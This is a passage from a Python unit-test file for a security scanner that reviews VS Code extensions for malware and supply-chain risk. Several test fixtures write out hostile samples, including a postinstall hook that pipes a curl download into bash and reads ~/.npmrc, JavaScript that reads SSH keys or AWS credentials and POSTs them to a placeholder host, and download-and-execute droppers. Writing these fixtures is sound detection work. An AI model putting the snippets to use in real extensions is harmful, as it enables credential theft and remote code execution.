        self.assertIn("marketplace-low-rating", rule_ids)
        self.assertIn("marketplace-stale-extension", rule_ids)

    def test_name_impersonation_metric_is_reputation_context(self) -> None:
        findings = _marketplace_metadata_findings("random.chatgpt", {
            "extension_id": "random.chatgpt",
            "found": True,
            "publisher": "random",
            "publisher_verified": False,
            "extension_name": "chatgpt",
            "display_name": "ChatGPT",
            "install_count": 12,
            "rating_average": 0,
            "rating_count": 0,
        })

        impersonation = [finding for finding in findings if finding["rule_id"] == "marketplace-name-impersonation"]
        self.assertEqual(len(impersonation), 1)
        self.assertEqual(impersonation[0]["category"], "reputation")

    def test_repository_metadata_is_reputation_context(self) -> None:
        findings = _repository_metadata_findings("example.repo", {
            "repository": "https://github.com/example/repo",
            "found": True,
            "host": "github",
            "full_name": "example/repo",
            "archived": True,
            "disabled": False,
            "pushed_at": "2020-01-01T00:00:00Z",
        })

        self.assertIn("repo-archived", {finding["rule_id"] for finding in findings})
        self.assertIn("repo-stale", {finding["rule_id"] for finding in findings})
        self.assertTrue(all(finding["category"] == "reputation" for finding in findings))

    def test_dev_dependencies_are_not_report_dependencies(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dev-only","version":"1.0.0",'
                '"devDependencies":{"webpack":"5.75.0"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.dependencies, {})

    def test_package_lock_resolves_exact_runtime_dependencies(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"locked","version":"1.0.0",'
                '"dependencies":{"left-pad":"^1.0.0"}}',
                encoding="utf-8",
            )
            (root / "package-lock.json").write_text(
                '{"lockfileVersion":3,"packages":{'
                '"":{"dependencies":{"left-pad":"^1.0.0"}},'
                '"node_modules/left-pad":{"version":"1.3.0"},'
                '"node_modules/transitive":{"version":"2.4.0"},'
                '"node_modules/dev-only":{"version":"9.9.9","dev":true}'
                '}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.dependencies["left-pad"], "1.3.0")
        self.assertEqual(report.dependencies["transitive"], "2.4.0")
        self.assertNotIn("dev-only", report.dependencies)

    def test_node_modules_resolves_manifest_range_when_no_lockfile_exists(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"installed","version":"1.0.0",'
                '"dependencies":{"@scope/pkg":"^2.0.0"}}',
                encoding="utf-8",
            )
            installed = root / "node_modules" / "@scope" / "pkg"
            installed.mkdir(parents=True)
            (installed / "package.json").write_text('{"name":"@scope/pkg","version":"2.1.5"}', encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.dependencies["@scope/pkg"], "2.1.5")

    def test_mutable_and_unpinned_dependency_sources_are_low_hardening_notes(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"deps","version":"1.0.0",'
                '"dependencies":{"floating":"latest","remote":"git+https://github.com/example/pkg.git"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.severity, "LOW")
        self.assertEqual(report.malware_score, 0)
        self.assertGreater(report.risk_score, 0)
        self.assertIn("unpinned-dependency", {finding.rule_id for finding in report.findings})
        self.assertIn("mutable-dependency-source", {finding.rule_id for finding in report.findings})

    def test_install_time_chains_are_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"installer","version":"1.0.0",'
                '"scripts":{"postinstall":"curl https://example.com/payload.sh | bash && cat ~/.npmrc"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.malware_authority, "non_authoritative")
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("install-download-execute", rule_ids)
        self.assertIn("install-secret-access", rule_ids)
        self.assertIn("install-shell-obfuscation", rule_ids)

    def test_registry_url_environment_assignment_is_not_install_download(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"registry-auth","version":"1.0.0",'
                '"scripts":{"preinstall":"npm_config_registry=https://registry.npmjs.org npm exec ado-npm-auth"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.decision, "allow")
        self.assertNotIn("install-download-execute", rule_ids)

    def test_credential_command_activation_is_contextual_surface(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"account","version":"1.0.0",'
                '"activationEvents":["onCommand:example.login","onCommand:example.format"]}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        credential_findings = [
            finding for finding in report.findings if finding.rule_id == "credential-command-registration"
        ]
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.decision, "allow")
        self.assertEqual(len(credential_findings), 1)
        self.assertEqual(credential_findings[0].evidence["command"], "example.login")

    def test_agent_tool_schema_metrics_are_contextual_capabilities(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"agentic","version":"1.0.0",'
                '"contributes":{"languageModelTools":[{"name":"runCommand","description":"execute shell command and read workspace files via https url"}]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_score, 0)
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("agent-shell-tool", rule_ids)
        self.assertIn("agent-filesystem-tool", rule_ids)
        self.assertIn("agent-network-tool", rule_ids)

    def test_startup_activation_alone_is_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"startup-theme","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"],"contributes":{"themes":[]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.risk_score, 0)
        self.assertEqual(report.score_details["risk_score"], 0)
        self.assertEqual(report.score_details["basis"], "none")
        self.assertIn("startup-activation", {finding.rule_id for finding in report.findings})

    def test_activation_and_standard_ide_contributions_are_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"debugger","version":"1.0.0",'
                '"activationEvents":["onDebug"],"contributes":{"debuggers":[]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.risk_score, 0)
        self.assertIn("sensitive-activation", {finding.rule_id for finding in report.findings})
        self.assertIn("powerful-ide-contribution", {finding.rule_id for finding in report.findings})

    def test_dangerous_repository_workflow_is_low_hardening_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"workflow","version":"1.0.0","repository":"https://github.com/example/workflow"}',
                encoding="utf-8",
            )
            (workflows / "ci.yml").write_text(
                "on: pull_request_target\npermissions: write-all\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.severity, "LOW")
        self.assertIn("dangerous-github-workflow", {finding.rule_id for finding in report.findings})

    def test_sandbox_observations_are_imported_as_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "observed"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"example","name":"observed","version":"1.0.0"}',
                encoding="utf-8",
            )
            observations = root / "observations.json"
            observations.write_text(
                '{"extensions":{"example.observed":[{"kind":"secret_exfil","destination":"https://example.com"}]}}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], sandbox_observations_file=observations)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "suspicious")
        self.assertEqual(scanned["malware_authority"], "non_authoritative")
        self.assertIn("observed-secret-exfil", {finding["rule_id"] for finding in scanned["findings"]})

    def test_artifact_inventory_flags_native_and_packed_artifacts(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"artifacts","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native")
            (root / "payload.zip").write_bytes(b"packed")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.malware_score, 0)
        self.assertGreater(report.risk_score, 0)
        self.assertEqual(report.artifact_inventory["files_hashed"], 3)
        self.assertEqual(len(report.artifact_inventory["risky_artifacts"]), 2)
        self.assertIn("native-or-packed-artifact", {finding.rule_id for finding in report.findings})
        self.assertIn("packed-artifact", {finding.rule_id for finding in report.findings})

    def test_known_bad_hash_feed_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "bad-extension"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"bad","name":"extension","version":"1.0.0"}',
                encoding="utf-8",
            )
            payload = b"known bad payload"
            (extension / "extension.js").write_bytes(payload)
            digest = hashlib.sha256(payload).hexdigest()
            feed = root / "known-bad.json"
            feed.write_text(
                '{"hashes":[{"sha256":"' + digest + '","source":"unit-test","classification":"malware"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], known_bad_hashes_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("known-bad-artifact", {finding["rule_id"] for finding in scanned["findings"]})

    def test_threat_feed_extension_id_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "bad-extension"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"bad","name":"extension","version":"1.0.0"}',
                encoding="utf-8",
            )
            feed = root / "threat-feed.json"
            feed.write_text(
                '{"extensions":[{"extension_id":"bad.extension","classification":"malware","source":"unit-test"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], threat_feed_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("trusted-threat-feed-hit", {finding["rule_id"] for finding in scanned["findings"]})

    def test_exact_extension_advisory_blocks_without_calling_artifact_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"vulnerable","version":"1.2.3","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = {};", encoding="utf-8")
            artifact_hash = scan_extension(root).artifact_hash
            feed = Path(tmp) / "advisories.json"
            feed.write_text(json.dumps({
                "snapshot_version": "unit-test.1",
                "entries": [{
                    "extension_id": "example.vulnerable",
                    "version": "1.2.3",
                    "artifact_sha256": artifact_hash,
                    "advisory_id": "CVE-TEST-1",
                    "severity": "HIGH",
                    "policy_action": "block",
                    "source": "https://example.invalid/CVE-TEST-1",
                }],
            }), encoding="utf-8")

            report = scan_targets(paths=[root], extension_advisories_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["decision"], "block")
        self.assertEqual(scanned["severity"], "HIGH")
        self.assertEqual(scanned["verdict"], "review")
        self.assertEqual(scanned["malware_score"], 0)
        self.assertIn("known-vulnerable-extension", {finding["rule_id"] for finding in scanned["findings"]})
        self.assertEqual(report["intelligence"]["extension_advisories"]["snapshot_version"], "unit-test.1")

    def test_missing_required_extension_advisory_snapshot_fails_closed(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"clean","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = {};", encoding="utf-8")

            report = scan_targets(paths=[root], extension_advisories_file=Path(tmp) / "missing.json")

        scanned = report["extensions"][0]
        self.assertEqual(report["intelligence"]["extension_advisories"]["status"], "unavailable")
        self.assertEqual(scanned["analysis_status"], "incomplete")
        self.assertEqual(scanned["decision"], "incomplete")

    def test_vsix_is_scanned_in_quarantine_and_keeps_source_artifact_hash(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "sample.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"vsix","version":"1.0.0"}')
                archive.writestr("extension/extension.js", "console.log('ok')")

            report = scan_targets(paths=[vsix])

        scanned = report["extensions"][0]
        self.assertEqual(scanned["source"], "vsix")
        self.assertEqual(scanned["install_path"], str(vsix.resolve()))
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(len(scanned["artifact_inventory"]["vsix_hash"]), 64)
        self.assertEqual(scanned["artifact_inventory"]["source_artifact"], "sample.vsix")
        self.assertEqual(scanned["artifact_inventory"]["vsix_signature"]["present"], False)

    def test_known_bad_vsix_hash_feed_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "bad.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"bad","name":"vsix","version":"1.0.0"}')
                archive.writestr("extension/extension.js", "console.log('payload')")
            digest = hashlib.sha256(vsix.read_bytes()).hexdigest()
            feed = root / "known-bad.json"
            feed.write_text(
                '{"hashes":[{"sha256":"' + digest + '","source":"unit-test","classification":"malware"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[vsix], known_bad_hashes_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("known-bad-artifact", {finding["rule_id"] for finding in scanned["findings"]})

    def test_vendored_generated_code_does_not_drive_static_verdict(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"vendored","version":"1.0.0"}',
                encoding="utf-8",
            )
            vendored = root / "node_modules" / "pkg"
            vendored.mkdir(parents=True)
            (vendored / "index.js").write_text(
                "fetch('https://example.com'); require('child_process').exec('whoami'); eval('1')",
                encoding="utf-8",
            )
            py_vendor = root / "python_files" / "lib" / "pkg"
            py_vendor.mkdir(parents=True)
            (py_vendor / "module.py").write_text(
                "import subprocess\nsubprocess.Popen(['whoami'])\n__import__('os')\n",
                encoding="utf-8",
            )
            (root / "webview.min.js").write_text(
                "fetch('https://example.com'); require('child_process').exec('whoami'); eval('1')",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_authority, "none")
        self.assertTrue(all(finding.evidence["evidence_class"] == "reputation" for finding in report.findings))

    def test_large_generated_bundle_does_not_create_correlated_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"bundle","version":"1.0.0","main":"main.js"}',
                encoding="utf-8",
            )
            token_blob = (
                "process.env.SECRET_FILE; fetch('https://example.com'); "
                "eval(Buffer.from('YWxlcnQoMSk=','base64').toString()); rmSync('x',{recursive:true}); "
            )
            (root / "main.js").write_text("var bundle=1;\n" * 35 + token_blob * 4000, encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertIn("obfuscation-execution-network", {finding.rule_id for finding in report.findings})
        self.assertEqual(report.analysis_coverage["coverage_percent"], 100)

    def test_bundle_classification_is_independent_of_coverage_limit(self) -> None:
        minified = "const x=1;" * 110_000
        medium_minified = "const x=1;" * 60_000
        large_compiled = "const x=1;\n" * 1_000_000

        self.assertTrue(_is_generated_code_blob("dist/web.js", minified))
        self.assertTrue(_is_generated_code_blob("out/extension.js", medium_minified))
        self.assertTrue(_is_generated_code_blob("out/extension.js", large_compiled))
        self.assertFalse(_is_generated_code_blob("src/extension.js", "const x=1;\n" * 100))

    def test_generated_bundle_does_not_create_file_wide_csp_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-bundle","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "createWebviewPanel();" + "const filler=1;" * 20_000,
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn("webview-csp-missing", {finding.rule_id for finding in report.findings})

    def test_generated_bundle_preserves_explicit_unsafe_csp_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-csp","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "createWebviewPanel();"
                "const html=`<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-eval'\">`;"
                + "const filler=1;" * 20_000,
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn("webview-csp-unsafe-directive", {finding.rule_id for finding in report.findings})

    def test_generated_bundle_preserves_real_credential_network_flow_detection(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"generated-exfil","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs');"
                "const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
                "fetch('https://example.invalid',{method:'POST',body:key});"
                + "const filler=1;" * 20_000,
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn(
            "credential-exfiltration-chain",
            {finding.rule_id for finding in report.findings},
        )

    def test_neighboring_minified_call_does_not_contaminate_configuration_update(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"bounded-call","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "workspace.getConfiguration('github').update('copilot.instructions',value),"
                "commands.executeCommand('trivy.loginWithToken');",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn("credential-config-update", {finding.rule_id for finding in report.findings})

    def test_declared_dist_entrypoint_is_never_silently_skipped(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "dist").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dist-entry","version":"1.0.0","main":"dist/extension.js"}',
                encoding="utf-8",
            )
            (root / "dist" / "extension.js").write_text(
                "const fs=require('fs'); const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
                "fetch('https://example.invalid',{method:'POST',body:key});",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "block")
        self.assertIn("dist/extension.js", report.analysis_coverage["analyzed_executable_files"])

    def test_executable_content_after_old_text_limit_is_analyzed(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"large-entry","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            payload = (
                "const fs=require('fs'); const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
                "fetch('https://example.invalid',{method:'POST',body:key});"
            )
            (root / "extension.js").write_text("const padding='x';\n" * 14_000 + payload, encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.analysis_coverage["status"], "complete")

    def test_missing_declared_entrypoint_is_incomplete_not_allow(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"missing-entry","version":"1.0.0","main":"dist/missing.js"}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.decision, "incomplete")
        self.assertTrue(report.artifact_inventory["scan_incomplete"])
        self.assertIn("dist/missing.js", report.analysis_coverage["missing_entrypoints"])

    def test_suffixless_node_entrypoint_resolves_to_javascript(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "out").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"suffixless","version":"1.0.0","main":"out/extension"}',
                encoding="utf-8",
            )
            (root / "out" / "extension.js").write_text("module.exports = {};", encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.decision, "allow")
        self.assertEqual(report.analysis_coverage["missing_entrypoints"], [])
        self.assertIn("out/extension.js", report.analysis_coverage["resolved_entrypoints"])

    def test_weak_standalone_static_indicator_stays_clean(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"weak","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("const token = process.env.API_TOKEN;", encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_authority, "none")
        self.assertEqual(report.severity, "INFO")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.risk_score, 0)
        self.assertIn("weak", {finding.evidence["evidence_class"] for finding in report.findings})

    def test_correlated_static_chain_is_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"chain","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs = require('fs'); const https = require('https');"
                "const secretPath = process.env.SECRET_FILE;"
                "const data = fs.readFileSync(secretPath); https.request('https://example.com').write(data);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.malware_authority, "non_authoritative")
        self.assertEqual(report.decision, "block")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.public_outcome, "preventive_block")
        self.assertGreaterEqual(report.risk_score, report.malware_score)
        self.assertIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_standalone_download_execute_requires_review_not_block(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"tool-installer","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const https=require('https'); const cp=require('child_process');"
                "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})

    def test_automatic_credential_aware_download_execute_is_preventively_blocked(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"credential-dropper","version":"1.0.0",'
                '"activationEvents":["*"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode=require('vscode'); const https=require('https');"
                "const cp=require('child_process');"
                "vscode.window.showInputBox({prompt:'Enter API token'});"
                "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "block")
        self.assertIn("download-and-execute", rule_ids)
        self.assertIn("credential-inputbox-prompt", rule_ids)
        self.assertIn("broad-activation", rule_ids)
        self.assertIn("preventive policy decision", report.decision_reason)

    def test_destructured_process_alias_cannot_bypass_download_execute_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"aliased-dropper","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode=require('vscode'); const https=require('https');"
                "const {execFile: launch}=require('node:child_process');"
                "vscode.window.showInputBox({prompt:'Enter access token'});"
                "https.get('https://example.com/payload',()=>launch('/tmp/payload'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "block")
        self.assertIn("process-execution", rule_ids)
        self.assertIn("download-and-execute", rule_ids)

    def test_esm_process_alias_is_detected_without_bare_name_false_positive(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"esm-installer","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "import { spawn as launch } from 'child_process';"
                "fetch('https://example.com/tool').then(()=>launch('/tmp/tool'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})

    def test_far_apart_static_tokens_do_not_create_correlated_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"far-apart","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const token = process.env.API_TOKEN;\n"
                + "\n".join(f"const filler{i}=true;" for i in range(80))
                + "\nconst fs = require('fs'); fs.readFileSync('/tmp/example');\n"
                + "\n".join(f"const gap{i}=true;" for i in range(80))
                + "\nrequire('https').request('https://example.com').end();\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotEqual(report.verdict, "suspicious")
        self.assertNotIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_previous_report_deltas_are_reported_without_changing_verdict(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "current"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"example","name":"delta","version":"2.0.0","dependencies":{"left-pad":"1.3.0"}}',
                encoding="utf-8",
            )
            previous = root / "previous.json"
            previous.write_text(
                '{"extensions":[{"extension_id":"example.delta","version":"1.0.0","verdict":"clean",'
                '"risk_score":0,"malware_score":0,"dependencies":{},"artifact_inventory":{"risky_artifacts":[]}}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[extension], previous_report_file=previous)

        self.assertEqual(report["extensions"][0]["verdict"], "clean")
        self.assertEqual(report["version_deltas"][0]["extension_id"], "example.delta")
        self.assertIn("version", report["version_deltas"][0]["changes"])
        self.assertIn("dependencies", report["version_deltas"][0]["changes"])
        self.assertTrue(report["human_summary"])

    def test_sandbox_runner_plan_does_not_execute_by_default(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"sandboxed","version":"1.0.0",'
                '"scripts":{"postinstall":"echo should-not-run"}}',
                encoding="utf-8",
            )

            observations = run_sandbox(root)

        self.assertEqual(observations["mode"], "plan-only")
        self.assertEqual(observations["plan"]["extension_id"], "example.sandboxed")
        self.assertEqual(len(observations["plan"]["commands"]), 1)
        self.assertEqual(observations["extensions"]["example.sandboxed"], [])

    def test_sandbox_runner_runtime_instrumentation_observes_secret_exfil(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"runtime","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'); const https=require('https');"
                "function activate(){"
                "const data=fs.readFileSync(process.env.HOME+'/.aws/credentials','utf8');"
                "const req=https.request('https://example.invalid/collect',{method:'POST'});"
                "req.write(data); req.end();"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            with self.assertRaisesRegex(ValueError, "OS-level"):
                run_sandbox(root, allow_execute=True, timeout_seconds=5)

    def test_repo_binary_artifacts_metric_fires_for_committed_native_binary(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native-binary-payload")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("repo-binary-artifacts", rule_ids)
        self.assertIn("binary-without-origin", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.verdict, "review")

    def test_artifact_controlled_checksum_does_not_prove_binary_origin(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native-signed","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native-binary-payload")
            (root / "server.node.sha256").write_text("deadbeef", encoding="utf-8")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("repo-binary-artifacts", rule_ids)
        self.assertIn("binary-without-origin", rule_ids)

    def test_artifact_controlled_node_manifest_does_not_prove_binary_origin(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native-package","version":"1.0.0"}',
                encoding="utf-8",
            )
            package = root / "node_modules" / "native-addon"
            package.mkdir(parents=True)
            (package / "package.json").write_text(
                '{"name":"native-addon","version":"2.0.0","repository":"https://example.invalid/native-addon",'
                '"files":["addon.node"]}',
                encoding="utf-8",
            )
            (package / "addon.node").write_bytes(b"native-binary-payload")

            report = scan_extension(root)

